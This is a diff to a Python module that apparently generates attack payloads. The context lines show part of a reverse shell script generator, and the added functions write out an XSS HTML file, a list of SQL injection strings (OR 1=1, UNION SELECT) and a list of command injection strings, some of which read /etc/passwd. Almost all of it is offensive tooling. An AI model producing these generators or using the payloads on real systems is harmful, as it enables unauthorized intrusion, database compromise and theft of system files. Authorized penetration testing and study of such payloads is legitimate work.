@@ -246,3 +246,88 @@ p=subprocess.call(["{shell_process}","-i"])
     except Exception as e:
         logging.error(f"Failed to create reverse shell script: {e}")
         return False
+
+# --- Web Payload Generators ---
+
+def generate_xss_html(output_filename, payload="<script>alert('XSS')</script>"):
+    """
+    Generates an HTML file with a simple XSS payload.
+    """
+    html_content = f"""
+<html>
+<head>
+    <title>XSS Test</title>
+</head>
+<body>
+    <h1>XSS Payload</h1>
+    {payload}
+</body>
+</html>
+"""
+    try:
+        with open(output_filename, "w") as f:
+            f.write(html_content)
+        logging.info(f"Successfully created XSS HTML file: {output_filename}")
+        return True
+    except Exception as e:
+        logging.error(f"Failed to create XSS HTML file: {e}")
+        return False
+
+def generate_sqli_payloads(output_filename, payloads=None):
+    """
+    Generates a text file with a list of common SQL injection payloads.
+    """
+    if payloads is None:
+        payloads = [
+            "' OR '1'='1",
+            "' OR 1=1 --",
+            "' OR 1=1#",
+            "' OR 1=1/*",
+            "admin'--",
+            "admin' #",
+            "admin'/*",
+            "' OR 'x'='x",
+            "1' ORDER BY 1--",
+            "1' ORDER BY 2--",
+            "1' ORDER BY 3--",
+            "1' UNION SELECT NULL, NULL, NULL--",
+            "1' UNION SELECT 1, 2, 3--",
+        ]
+
+    try:
+        with open(output_filename, "w") as f:
+            f.write("\\n".join(payloads))
+        logging.info(f"Successfully created SQLi payloads file: {output_filename}")
+        return True
+    except Exception as e:
+        logging.error(f"Failed to create SQLi payloads file: {e}")
+        return False
+
+def generate_command_injection_payloads(output_filename, payloads=None):
+    """
+    Generates a text file with a list of common command injection payloads.
+    """
+    if payloads is None:
+        payloads = [
+            "; ls -la",
+            "| ls -la",
+            "&& ls -la",
+            "|| ls -la",
+            "& ls -la",
+            "| whoami",
+            "; whoami",
+            "&& whoami",
+            "|| whoami",
+            "& whoami",
+            "| cat /etc/passwd",
+            "; cat /etc/passwd",
+        ]
+
+    try:
+        with open(output_filename, "w") as f:
+            f.write("\\n".join(payloads))
+        logging.info(f"Successfully created Command Injection payloads file: {output_filename}")
+        return True
+    except Exception as e:
+        logging.error(f"Failed to create Command Injection payloads file: {e}")
+        return False
